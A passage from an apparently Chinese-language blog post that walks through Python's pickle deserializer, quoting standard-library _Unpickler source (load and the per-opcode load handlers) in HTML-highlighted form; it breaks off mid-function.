class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的内容就是pickle中定义的所有字节码了，我们先略过这部分不谈，我们先来看后面的反序列化中对于不同字节码的实现来更好的理解每个字节码的注释内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">_Unpickler</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> fix_imports<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                 encoding<span class="token operator">=</span><span class="token string">"ASCII"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">"strict"</span><span class="token punctuation">,</span> buffers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_buffers <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span>buffers<span class="token punctuation">)</span> <span class="token keyword">if</span> buffers <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>_file_readline <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readline        self<span class="token punctuation">.</span>_file_read <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read        self<span class="token punctuation">.</span>memo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>encoding <span class="token operator">=</span> encoding        self<span class="token punctuation">.</span>errors <span class="token operator">=</span> errors        self<span class="token punctuation">.</span>proto <span class="token operator">=</span> <span class="token number">0</span>        self<span class="token punctuation">.</span>fix_imports <span class="token operator">=</span> fix_imports    <span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Read a pickled object representation from the open file.        Return the reconstituted object hierarchy specified in the file.        """</span>        <span class="token comment"># Check whether Unpickler was initialized correctly. This is</span>        <span class="token comment"># only needed to mimic the behavior of _pickle.Unpickler.dump().</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_file_read"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"Unpickler.__init__() was not called by "</span>                                  <span class="token string">"%s.__init__()"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__name__<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_unframer <span class="token operator">=</span> _Unframer<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_file_read<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_file_readline<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>read <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>read        self<span class="token punctuation">.</span>readinto <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readinto        self<span class="token punctuation">.</span>readline <span class="token operator">=</span> self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>readline        self<span class="token punctuation">.</span>metastack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append        self<span class="token punctuation">.</span>proto <span class="token operator">=</span> <span class="token number">0</span>        read <span class="token operator">=</span> self<span class="token punctuation">.</span>read        dispatch <span class="token operator">=</span> self<span class="token punctuation">.</span>dispatch        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                key <span class="token operator">=</span> read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> key<span class="token punctuation">:</span>                    <span class="token keyword">raise</span> EOFError                <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> bytes_types<span class="token punctuation">)</span>                dispatch<span class="token punctuation">[</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token keyword">except</span> _Stop <span class="token keyword">as</span> stopinst<span class="token punctuation">:</span>            <span class="token keyword">return</span> stopinst<span class="token punctuation">.</span>value    <span class="token comment"># Return a list of items pushed in the stack after last MARK instruction.</span>    <span class="token keyword">def</span> <span class="token function">pop_mark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        items <span class="token operator">=</span> self<span class="token punctuation">.</span>stack        self<span class="token punctuation">.</span>stack <span class="token operator">=</span> self<span class="token punctuation">.</span>metastack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>append        <span class="token keyword">return</span> items    <span class="token keyword">def</span> <span class="token function">persistent_load</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"unsupported persistent id encountered"</span><span class="token punctuation">)</span>    dispatch <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">def</span> <span class="token function">load_proto</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        proto <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> proto <span class="token operator">&lt;=</span> HIGHEST_PROTOCOL<span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"unsupported pickle protocol: %d"</span> <span class="token operator">%</span> proto<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>proto <span class="token operator">=</span> proto    dispatch<span class="token punctuation">[</span>PROTO<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_proto    <span class="token keyword">def</span> <span class="token function">load_frame</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        frame_size<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> frame_size <span class="token operator">></span> sys<span class="token punctuation">.</span>maxsize<span class="token punctuation">:</span>            <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"frame size > sys.maxsize: %d"</span> <span class="token operator">%</span> frame_size<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_unframer<span class="token punctuation">.</span>load_frame<span class="token punctuation">(</span>frame_size<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>FRAME<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_frame    <span class="token keyword">def</span> <span class="token function">load_persid</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pid <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span>                <span class="token string">"persistent IDs in protocol 0 must be ASCII strings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>persistent_load<span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>PERSID<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_persid    <span class="token keyword">def</span> <span class="token function">load_binpersid</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        pid <span class="token operator">=</span> self<span class="token punctuation">.</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>persistent_load<span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINPERSID<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binpersid    <span class="token keyword">def</span> <span class="token function">load_none</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>NONE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_none    <span class="token keyword">def</span> <span class="token function">load_false</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>NEWFALSE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_false    <span class="token keyword">def</span> <span class="token function">load_true</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>NEWTRUE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_true    <span class="token keyword">def</span> <span class="token function">load_int</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data <span class="token operator">==</span> FALSE<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            val <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">elif</span> data <span class="token operator">==</span> TRUE<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            val <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            val <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>val<span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>INT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_int    <span class="token keyword">def</span> <span class="token function">load_binint</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>unpack<span class="token punctuation">(</span><span class="token string">'&lt;i'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BININT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binint    <span class="token keyword">def</span> <span class="token function">load_binint1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BININT1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binint1    <span class="token keyword">def</span> <span class="token function">load_binint2</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>unpack<span class="token punctuation">(</span><span class="token string">'&lt;H'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BININT2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binint2    <span class="token keyword">def</span> <span class="token function">load_long</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        val <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> val <span class="token keyword">and</span> val<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">b'L'</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            val <span class="token operator">=</span> val<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>LONG<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_long    <span class="token keyword">def</span> <span class="token function">load_long1</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>decode_long<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>LONG1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_long1    <span class="token keyword">def</span> <span class="token function">load_long4</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;i'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment"># Corrupt or hostile pickle -- we never write one like this</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"LONG pickle has negative byte count"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>decode_long<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>LONG4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_long4    <span class="token keyword">def</span> <span class="token function">load_float</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">float</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>FLOAT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_float    <span class="token keyword">def</span> <span class="token function">load_binfloat</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>unpack<span class="token punctuation">(</span><span class="token string">'>d'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINFLOAT<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binfloat    <span class="token keyword">def</span> <span class="token function">_decode_string</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Used to allow strings from Python 2 to be decoded either as</span>        <span class="token comment"># bytes or Unicode strings.  This should be used only with the</span>        <span class="token comment"># STRING, BINSTRING and SHORT_BINSTRING opcodes.</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>encoding <span class="token operator">==</span> <span class="token string">"bytes"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> value        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> value<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>self<span class="token punctuation">.</span>encoding<span class="token punctuation">,</span> self<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">load_string</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token comment"># Strip outermost quotes</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">2</span> <span class="token keyword">and</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token string">b'"\''</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"the STRING opcode argument must be quoted"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_decode_string<span class="token punctuation">(</span>codecs<span class="token punctuation">.</span>escape_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>STRING<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_string    <span class="token keyword">def</span> <span class="token function">load_binstring</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Deprecated BINSTRING uses signed 32-bit length</span>        <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;i'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BINSTRING pickle has negative byte count"</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_decode_string<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINSTRING<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binstring    <span class="token keyword">def</span> <span class="token function">load_binbytes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">></span> maxsize<span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BINBYTES exceeds system's maximum size "</span>                                  <span class="token string">"of %d bytes"</span> <span class="token operator">%</span> maxsize<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINBYTES<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binbytes    <span class="token keyword">def</span> <span class="token function">load_unicode</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'raw-unicode-escape'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>UNICODE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_unicode    <span class="token keyword">def</span> <span class="token function">load_binunicode</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">></span> maxsize<span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BINUNICODE exceeds system's maximum size "</span>                                  <span class="token string">"of %d bytes"</span> <span class="token operator">%</span> maxsize<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'surrogatepass'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINUNICODE<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binunicode    <span class="token keyword">def</span> <span class="token function">load_binunicode8</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">></span> maxsize<span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BINUNICODE8 exceeds system's maximum size "</span>                                  <span class="token string">"of %d bytes"</span> <span class="token operator">%</span> maxsize<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'surrogatepass'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINUNICODE8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binunicode8    <span class="token keyword">def</span> <span class="token function">load_binbytes8</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">></span> maxsize<span class="token punctuation">:</span>            <span class="token keyword">raise</span> UnpicklingError<span class="token punctuation">(</span><span class="token string">"BINBYTES8 exceeds system's maximum size "</span>                                  <span class="token string">"of %d bytes"</span> <span class="token operator">%</span> maxsize<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dispatch<span class="token punctuation">[</span>BINBYTES8<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> load_binbytes8    <span class="token keyword">def</span> <span class="token function">load_bytearray8</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">len</span><span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">len</span> <span class="token operator">></span> maxsize<span 